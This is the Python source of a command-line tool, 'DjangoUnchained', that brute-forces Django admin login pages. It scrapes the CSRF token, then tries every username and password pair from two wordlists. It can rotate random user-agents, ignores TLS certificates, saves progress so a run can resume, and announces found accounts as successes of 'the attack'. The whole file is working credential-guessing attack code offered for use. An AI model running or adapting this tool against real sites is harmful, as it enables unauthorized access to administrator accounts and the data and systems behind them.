#!/usr/bin/env python

import urllib3
import argparse
from bs4 import BeautifulSoup
import logging
import sys
from colorama import Back, Fore, Style
import pickle
import os
from fake_useragent import UserAgent


__author__  = 'n3bojs4'
__email__   = 'n3bojs4@gmail.com'
__git__     = 'https://github.com/n3bojs4/DjangoUnchained'
__version__ = '0.2'
__license__ = 'MIT'
__pyver__   = '%d.%d.%d' % sys.version_info[0:3]


def banner():
    print(Fore.GREEN, Style.BRIGHT,"""
---------------------------------------------------
  ____  _                                         
 |  _ \(_) __ _ _ __   __ _  ___                  
 | | | | |/ _` | '_ \ / _` |/ _ \                 
 | |_| | | (_| | | | | (_| | (_) |                
 |____// |\__,_|_| |_|\__, |\___/                 
     |__/             |___/                       
  _   _            _           _                _ 
 | | | |_ __   ___| |__   __ _(_)_ __   ___  __| |
 | | | | '_ \ / __| '_ \ / _` | | '_ \ / _ \/ _` |
 | |_| | | | | (__| | | | (_| | | | | |  __/ (_| |
  \___/|_| |_|\___|_| |_|\__,_|_|_| |_|\___|\__,_|

----------------------------------------------------                                                  

Django Admin Panel password testing tool v"""+__version__+" - by "+__author__+"\n"
+__git__," python:"+ __pyver__,Style.RESET_ALL+"\n")



# Get arguments

parser = argparse.ArgumentParser()
parser.add_argument("-domain",help="Domain for the django admin login page ( add the :port if non standard, eq: domain.com:8000 ).",required=True)
parser.add_argument("-scheme",help="http or https scheme.",required=True)
parser.add_argument("-uri",help="uri for the admin login page, \"/admin/login/\" is the most common.",required=True)
parser.add_argument("-userdict",help="dictionnary file for user list.",required=True)
parser.add_argument("-passwdict",help="dictionnary file for password.",required=True)
parser.add_argument("-onlygood",help="Show only good attempts.",action='store_true', default=False, required=False)
parser.add_argument("-rua",help="Use random user-agent.",action='store_true', default=False, required=False)
parser.add_argument("-l",help="Log to a file.",required=False)
parser.add_argument("-restore",help="restore from a .session file, by default domain name is used to save the session.",required=False)


# Show banner
banner()

# Parse args
args = parser.parse_args()


domain = args.domain
scheme = args.scheme
uri = args.uri
userdict = args.userdict
passwords = args.passwdict
onlygood = args.onlygood
logfile = args.l
rsession = args.restore
rua = args.rua

admin_url = scheme + '://' + domain + uri


# Loading user-agents
if rua is True:
    ua = UserAgent()


# Disable warnings for certs
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# By default certs are ignored
http = urllib3.PoolManager(cert_reqs='CERT_NONE')

# initiate logger if logging is on
if logfile:
    logger = logging.getLogger()
    try:
        LOGFILE = logging.FileHandler(logfile)
    except:
        print("cannot open logfile:",logfile)
        exit(1)
    formatter = logging.Formatter('%(asctime)s - %(message)s')
    LOGFILE.setFormatter(formatter)
    logger.addHandler(LOGFILE)






headers={'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
            'Referer': domain + uri }

# Functions

def Authenticate(admin_url,username,password,randomua):
    if randomua is True:
        headers['User-Agent'] = ua.random
    
    try:
        r = http.request('GET', admin_url, headers=headers)
    except urllib3.exceptions.MaxRetryError as e:
        print("Connection error:",e)
        exit(1)
    
    login_page = r.data
    Cookies = r.headers["Set-Cookie"]
    
    try:
        soup = BeautifulSoup(login_page, 'html.parser')
    except Exception as e:
        print("Error when reading response:",e)
        exit(1)

    # Getting the csrf token
    csrfmiddlewaretoken = soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']

    # Getting next page
    nextpage = soup.find('input', {'name': 'next'})['value']
    
    # creating the fields and the headers
    headers["Cookie"] = Cookies
    
    payload = "csrfmiddlewaretoken="+csrfmiddlewaretoken+"&"+"username="+username+"&"+"next="+nextpage+"&password="+password
    
    postlogin = http.request('POST', admin_url, headers=headers, body=payload.encode('utf-8'), redirect=False)
    data = postlogin.data.decode('utf-8')

    if "CSRF" in data:
        msg = "CSRF token missing or invalid !"
        print(msg)
        if logfile:
            logger.warning(msg)
    elif "Please" in data and onlygood is False:
        msg = "Trying username:" + username + " password:" + password + " FAILED"
        print(msg)
        if logfile:
            logger.warning(msg)
    elif postlogin.status == 302 :
        if "sessionid" in postlogin.headers["Set-Cookie"]:
            msg = "SUCCESS: Found a valid account !!! --> username:" + username + " pass:" + password
            print(Back.YELLOW+Fore.RED+Style.BRIGHT+msg+Style.RESET_ALL)
            if logfile:
                logger.warning(msg)
        else:
            msg = "SUCCESS: It seems we found a valid account --> username:" + username + " pass:" + password + " but no sessionid cookie has been set, check manually !"
            print(Back.YELLOW+Fore.RED+Style.BRIGHT+msg+Style.RESET_ALL)
            if logfile:
                logger.warning(msg)
    else:
        msg = "Unexpected server reply with user: "+username+" pass: "+password+" Status :"+str(postlogin.status)+" Content:"+str(postlogin.headers)+data
        print(Back.WHITE+Fore.RED+"Unexpected server reply with user: "+username+" pass: "+password)
        print("Status :",postlogin.status)
        print("Content:",str(postlogin.headers),data,Style.RESET_ALL)
        if logfile:
            logger.error(msg)
    

def CredentialsStuffer(userdict,passwords):
    userlist = []
    passwordlist = []
    database = []
    
    # Opening dict files
    try:
        USERS = open(userdict,'r')
    except:
        print("cannot open users file :",userdict)
        exit(1)
    try:
        PASSWORDS = open(passwords,'r')
    except:
        print("cannot open password file :",userdict)
        exit(1)
    
    # Extracting users passwords from files
    for word in USERS.readlines():
        userlist.append(word.strip())
    
    for word in PASSWORDS.readlines():
        passwordlist.append(word.strip())
    
    # Creating the database
    for user in userlist:
        for password in passwordlist:
            database.append([user,password])
    return database
    

def SaveSession(mylist,domain):
    sessionfile = '.'+domain+'.session'
    
    if len(mylist) == 0:
        print("Cleaning session file.")
        os.remove(sessionfile)
    else:
        try:
            with open(sessionfile,"wb") as f:
                pickle.dump(mylist,f)
        except:
            print("cannot save the session file into",sessionfile,"aborting :'(")
            exit(1)


def RestoreSession(domain):
    sessionfile = '.'+domain+'.session'

    with open(sessionfile,'rb') as f:
        try:
            restored = pickle.load(f)
        except:
            print("cannot restore session, file is corrupt :'(")
            exit(1)
    
    return restored



# Main

# Restore session if needed
if rsession:
    print("Trying to restore the previous session !")
    try:
        Credentials = RestoreSession(domain)
    except:
        print("Cannot restore your session file: ",rsession)
        exit(1)
else:
    # Generate all credentials
    Credentials = CredentialsStuffer(userdict,passwords)


print("Starting the attack against",admin_url,"...")

while Credentials:
    record = Credentials.pop(0)
    login = record[0]
    password = record[1]
    if rua is True:
        Authenticate(admin_url,login,password,True)
    else:
        Authenticate(admin_url,login,password,False)
    
    SaveSession(Credentials,domain)


print("Attack is finished !")
